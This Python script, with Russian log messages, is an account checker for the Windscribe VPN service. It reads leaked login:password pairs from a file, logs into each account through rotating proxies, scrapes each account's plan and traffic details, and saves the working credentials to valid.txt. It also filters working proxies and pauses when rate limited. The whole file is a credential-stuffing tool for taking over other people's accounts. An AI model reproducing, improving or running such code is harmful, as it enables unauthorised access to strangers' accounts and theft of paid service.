import time
import re
import requests
from bs4 import BeautifulSoup
from loguru import logger
from random import choice
import threading
import config
global PROXE
global ACCOUNTS

with open("accounts.txt", "r", encoding="utf-8") as file:
    ACCOUNTS = file.read().split("\n")

with open("proxies.txt", "r", encoding="utf-8") as file:
    PROXE = file.read().split("\n")

START = True

class Bot():
    def __init__(self, login, password):
        self.host = "https://rus.windscribe.com"
        self.login = login
        self.password = password

    def get_ip(self):
        try:
            while True:
                random_proxy = choice(PROXE)
                proxy = random_proxy
                PROXE.remove(random_proxy)

                PROXYES = {"http": f"http://{proxy}", "https": f"http://{proxy}"}


                self.client = requests.session()
                self.client.proxies.update(PROXYES)

                ip = self.client.get("https://api64.ipify.org?format=json").json()

                logger.success(f"Найден валидный прокси: {ip['ip']}")

                with open("valid_proxies.txt", "a", encoding="utf-8") as file:
                    file.write(f"{proxy}\n")
        except:
            pass

    def check(self):

        try:

            if START == False:
                while True:
                    if START:
                        self.check()
                    else:
                        time.sleep(30)


            elif START:
                for i in range(0, 2):
                    logger.debug(f"Проверяю аккаунт: {self.login}:{self.password}")
                    proxy = choice(PROXE)

                    PROXYES = {"http": f"http://{proxy}", "https": f"http://{proxy}"}

                    self.client = requests.session()
                    # self.client.proxies.update(PROXYES)


                    data = {
                        "csrf_time" : str(time.time()).split(".")[0],
                    }

                    r = self.client.post("https://res.windscribe.com/res/logintoken", data=data)

                    time.sleep(0.3)

                    csrf = r.json()["csrf_token"]
                    logger.info(r.json())
                    logger.info(f"Успешно получен csrf-token: {csrf}")


                    data = {
                        "login": "1",
                        "upgrade": "0",
                        "csrf_time": str(time.time()).split(".")[0],
                        "csrf_token": csrf,
                        "username": self.login,
                        "password": self.password,
                        "code" : ""
                    }

                    r = self.client.post("https://rus.windscribe.com/login", data=data)

                    try:
                        ban_check = len(r.text)
                        if ban_check > 5:
                            soup = BeautifulSoup(r.text, "lxml")
                            check = soup.find("div", {"class" : "content_message error"}).text
                            logger.critical(check)

                            if "Превышен лимит" in check or "Rate limited":
                                if self.start:
                                    self.start = False
                                    time.sleep(300)
                                    self.start = True
                    except: pass
                    time.sleep(0.3)

                    r = self.client.get("https://rus.windscribe.com/myaccount")

                    soup = BeautifulSoup(r.text, "lxml")

                    articles = soup.find_all("div", {"class" : "ma_item"})
                    reg_date = articles[1].text.split("\n")[3]
                    status = articles[4].text.split("\n")[3]
                    next_reset = articles[5].text.split("\n")[2]
                    trafic_parse = articles[6].text.split("\n")
                    trafic = trafic_parse[3] + " " + trafic_parse[4]
                    get_status_GB = trafic.split(" ")[0].replace("GB", "")

                    text = f"login: {self.login} | password: {self.password} | reg_date: {reg_date} | status: {status} | next_reset: {next_reset} | trafic: {trafic}\n"


                    logger.success(f"Успешно найден валидный аккаунт\nreg_date: {reg_date}\nstatus: {status}\nnext_reset: {next_reset}\ntrafic: {trafic}")



                    if int(config.status) <= int(get_status_GB):
                        with open("valid.txt", "a+", encoding="utf-8") as file: file.write(text)
                    return

        except IndexError:
            logger.error(f"Аккаунт невалид: {self.login}:{self.password}")

        except Exception as ex:
            print(ex)
            # logger.critical("Неизвестная ошибка, отпишите кодеру: @Benefix")
            # logger.info(ex)
        return



def winscribe():

    for i in range(len(ACCOUNTS)):
        try:
            info = ACCOUNTS.pop()
            logger.success(info)
            login = info.split(":")[0]
            password = info.split(":")[1]

            bot = Bot(login, password)
            if START:
                threading.Thread(target=bot.check).start()
            else:
                while True:
                    if START:
                        threading.Thread(target=bot.check).start()
                    else:
                        time.sleep(30)

            time.sleep(5)

        except Exception as ex: return

def proxies():
    bot = Bot("123", "123").get_ip()


def main():
    choice_user = int(input("1 - чек прокси\n2 - check winscribe\nВведите цифру: "))

    if choice_user == 1:
        choice_threading = int(input("Введите в сколько потоков запускать скрипт: "))

        for i in range(choice_threading):
            x = threading.Thread(target=proxies).start()

    elif choice_user == 2:
        winscribe()
        # for i in range(choice_threading):
        #     x = threading.Thread(target=winscribe).start()
        #     time.sleep(3)

if __name__ == "__main__":
    main()